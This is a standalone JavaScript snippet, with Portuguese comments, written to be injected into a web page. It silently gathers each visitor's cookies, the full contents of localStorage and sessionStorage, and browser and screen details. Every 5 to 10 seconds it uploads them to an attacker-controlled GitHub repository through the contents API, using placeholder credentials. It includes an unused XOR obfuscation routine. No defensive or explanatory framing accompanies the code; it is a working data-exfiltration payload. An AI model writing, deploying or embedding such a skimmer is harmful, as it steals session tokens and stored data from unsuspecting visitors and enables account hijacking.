<script>
(function() {
    function gerarChave() {
        return Math.random().toString(36).substr(2, 8);
    }

    // Função de ofuscação básica
    function ofuscar(str) {
        let chave = gerarChave();
        let dados = str.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ chave.charCodeAt(0))).join('');
        return dados;
    }

    // Enviar dados para o GitHub via API REST
    function enviarParaGitHub(dados) {
        const url = 'https://api.github.com/repos/SEU_USUARIO/SEU_REPOSITORIO/contents/caminho/para/arquivo.json'; // Substitua pela URL da API do seu repositório
        const token = 'SEU_TOKEN_DE_AUTENTICACAO'; // Substitua com seu token de autenticação do GitHub

        const headers = {
            'Content-Type': 'application/json',
            'Authorization': `token ${token}`
        };

        // Codificar os dados como base64 antes de enviar (necessário para o GitHub API)
        const dadosBase64 = btoa(dados);

        const body = JSON.stringify({
            message: 'Atualização de dados coletados',  // Mensagem de commit
            content: dadosBase64,  // Arquivo codificado em base64
            branch: 'main'  // A branch onde você deseja armazenar o arquivo
        });

        // Enviar os dados via fetch
        fetch(url, {
            method: 'PUT',
            headers: headers,
            body: body
        })
        .then(response => response.json())
        .then(data => console.log('Dados enviados com sucesso:', data))
        .catch(error => console.error('Erro ao enviar dados:', error));
    }

    // Coletar informações detalhadas
    function coletarDados() {
        let dados = {
            userAgent: navigator.userAgent,
            navegador: navigator.appName,
            plataforma: navigator.platform,
            tela: {
                largura: screen.width,
                altura: screen.height,
                profundidade: screen.colorDepth
            },
            cookies: document.cookie,
            localStorage: localStorage.length,
            sessionStorage: sessionStorage.length,
            geolocalizacao: "Não permitida", // Não solicitando permissão
            dispositivo: {
                tipo: 'Desktop/Móvel',
                toques: []
            },
            armazenamento: {
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage)
            }
        };

        // Coletar dados de toque (em dispositivos móveis)
        if ('ontouchstart' in window) {
            dados.dispositivo.tipo = 'Móvel';
            dados.dispositivo.toques = [{ x: 10, y: 15 }];  // Exemplo de toque
        }

        // Ofuscando e enviando os dados para o GitHub
        enviarParaGitHub(JSON.stringify(dados));
    }

    // Executando a coleta periodicamente com atraso
    setInterval(coletarDados, Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000);
})();
</script>
